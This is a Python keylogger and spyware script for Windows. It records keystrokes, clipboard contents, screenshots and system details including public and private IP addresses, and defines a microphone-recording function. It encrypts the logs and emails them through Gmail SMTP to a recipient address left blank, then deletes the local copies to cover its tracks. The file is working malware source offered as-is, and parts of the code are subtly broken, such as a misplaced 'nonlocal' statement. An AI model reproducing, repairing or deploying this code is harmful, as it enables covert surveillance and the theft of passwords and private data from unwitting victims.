# Required Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# Defining file names for logging and data collection
key_log_file = "key_log.txt"
system_info_file = "system_info.txt"
clipboard_file = "clipboard.txt"
audio_file = "audio.wav"
screenshot_file = "screenshot.png"

encrypted_key_log_file = "encrypted_key_log.txt"
encrypted_system_info_file = "encrypted_system_info.txt"
encrypted_clipboard_file = "encrypted_clipboard.txt"

# Defining parameters
mic_record_time = 10  # in seconds
log_interval = 15  # in seconds
max_iterations = 4

# Email credentials
email_user = " "  # Enter the email here
email_pass = " "  # Enter the password here

# Get system user
current_user = getpass.getuser()

# Recipient email
recipient_email = " "  # Enter the email address to receive information

# Encryption key
encryption_key = " "  # Generate an encryption key from the Cryptography folder

# File paths
save_path = " "  # Enter the file path where files will be saved
path_separator = "\\"
full_file_path = save_path + path_separator

# Email sending function
def send_email(subject, attachment_path, recipient_email):
    sender_email = email_user

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject

    body = "Please find the attached log file."
    msg.attach(MIMEText(body, 'plain'))

    with open(attachment_path, 'rb') as attachment:
        p = MIMEBase('application', 'octet-stream')
        p.set_payload(attachment.read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(attachment_path)}")
        msg.attach(p)

    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(sender_email, email_pass)
        server.sendmail(sender_email, recipient_email, msg.as_string())

send_email("Key Log File", full_file_path + key_log_file, recipient_email)

# Function to collect system information
def gather_system_info():
    with open(full_file_path + system_info_file, "a") as file:
        hostname = socket.gethostname()
        private_ip = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            file.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            file.write("Failed to retrieve Public IP Address\n")

        file.write("Processor: " + platform.processor() + '\n')
        file.write("System: " + platform.system() + " " + platform.version() + '\n')
        file.write("Machine: " + platform.machine() + "\n")
        file.write("Hostname: " + hostname + "\n")
        file.write("Private IP Address: " + private_ip + "\n")

gather_system_info()

# Function to collect clipboard data
def retrieve_clipboard_data():
    with open(full_file_path + clipboard_file, "a") as file:
        try:
            win32clipboard.OpenClipboard()
            clipboard_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            file.write("Clipboard Data: \n" + clipboard_data + '\n')
        except Exception:
            file.write("Failed to access clipboard data\n")

retrieve_clipboard_data()

# Function to record audio from the microphone
def record_audio():
    sample_rate = 44100
    duration = mic_record_time

    recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2)
    sd.wait()

    write(full_file_path + audio_file, sample_rate, recording)

# Function to take a screenshot
def capture_screenshot():
    image = ImageGrab.grab()
    image.save(full_file_path + screenshot_file)

capture_screenshot()

# Keylogger functionality
iteration_count = 0
start_time = time.time()
end_time = start_time + log_interval

while iteration_count < max_iterations:
    key_buffer = []
    buffer_count = 0

    def on_key_press(key):
        nonlocal key_buffer, buffer_count, start_time
        key_buffer.append(key)
        buffer_count += 1
        start_time = time.time()

        if buffer_count >= 1:
            buffer_count = 0
            save_key_log(key_buffer)
            key_buffer = []

    def save_key_log(keys):
        with open(full_file_path + key_log_file, "a") as file:
            for key in keys:
                key_str = str(key).replace("'", "")
                if "space" in key_str:
                    file.write('\n')
                elif "Key" not in key_str:
                    file.write(key_str)

    def on_key_release(key):
        if key == Key.esc or time.time() > end_time:
            return False

    with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()

    if time.time() > end_time:
        with open(full_file_path + key_log_file, "w") as file:
            file.write(" ")

        capture_screenshot()
        send_email("Screenshot", full_file_path + screenshot_file, recipient_email)

        retrieve_clipboard_data()

        iteration_count += 1
        start_time = time.time()
        end_time = start_time + log_interval

# Encrypt files
files_to_encrypt = [full_file_path + system_info_file, full_file_path + clipboard_file, full_file_path + key_log_file]
encrypted_file_names = [full_file_path + encrypted_system_info_file, full_file_path + encrypted_clipboard_file, full_file_path + encrypted_key_log_file]

for i, file_to_encrypt in enumerate(files_to_encrypt):
    with open(file_to_encrypt, 'rb') as file:
        data = file.read()

    fernet = Fernet(encryption_key)
    encrypted_data = fernet.encrypt(data)

    with open(encrypted_file_names[i], 'wb') as file:
        file.write(encrypted_data)

    send_email(f"Encrypted File {i+1}", encrypted_file_names[i], recipient_email)

time.sleep(150)

# Clean up by deleting original files
files_to_remove = [system_info_file, clipboard_file, key_log_file, screenshot_file, audio_file]
for file in files_to_remove:
    os.remove(full_file_path + file)
